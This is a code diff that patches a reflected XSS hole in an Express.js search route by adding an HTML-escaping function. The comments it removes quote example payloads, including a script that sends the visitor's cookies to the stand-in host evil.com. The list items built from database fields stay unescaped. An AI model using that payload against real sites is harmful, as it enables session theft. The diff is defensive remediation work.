@@ -7,8 +7,17 @@ const express = require('express');
 const router = express.Router();
 const { getDatabase } = require('../config/database');
 
-// VULNERABLE: XSS - user input reflected directly in HTML response
-// GET /api/search?q=<script>alert('xss')</script>
+// Utility function to escape HTML special characters for XSS prevention
+function escapeHtml(text) {
+  return text
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+// FIXED: Applied HTML escaping to user input 'q' before embedding in HTML to prevent XSS
 router.get('/', (req, res) => {
   const { q } = req.query;
 
@@ -22,13 +31,13 @@ router.get('/', (req, res) => {
       'SELECT id, owner_name, account_type FROM accounts WHERE owner_name LIKE ?'
     ).all(`%${q}%`);
 
-    // VULNERABLE: User input reflected directly in HTML without encoding
-    // An attacker can inject: ?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+    const safeQ = escapeHtml(q); // Escaped user input
+
     const html = `
       <html>
         <head><title>Search Results</title></head>
         <body>
-          <h1>Search Results for: ${q}</h1>
+          <h1>Search Results for: ${safeQ}</h1>
           <p>Found ${results.length} results</p>
           <ul>
             ${results.map(r => `<li>${r.owner_name} - ${r.account_type}</li>`).join('')}
